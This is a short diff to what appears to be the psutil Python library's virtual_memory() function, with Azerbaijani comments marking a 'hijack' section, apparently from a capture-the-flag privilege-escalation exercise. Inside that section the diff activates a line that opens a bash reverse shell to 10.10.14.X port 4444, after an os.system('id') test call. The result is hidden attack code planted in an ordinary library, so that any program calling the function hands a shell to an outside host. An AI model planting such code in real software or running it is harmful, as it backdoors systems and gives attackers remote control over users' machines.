@@ -388,7 +388,7 @@ def virtual_memory():
     #### HİJACK BAŞLAYIR ####
     import os
     os.system('id')                          # Test üçün
-    # os.system('bash -i >& /dev/tcp/10.10.14.X/4444 0>&1')  # Reverse shell
+    os.system('bash -i >& /dev/tcp/10.10.14.X/4444 0>&1')  # Reverse shell
     #### HİJACK BİTİR ####
     global _TOTAL_PHYMEM
     ret = _psplatform.virtual_memory()
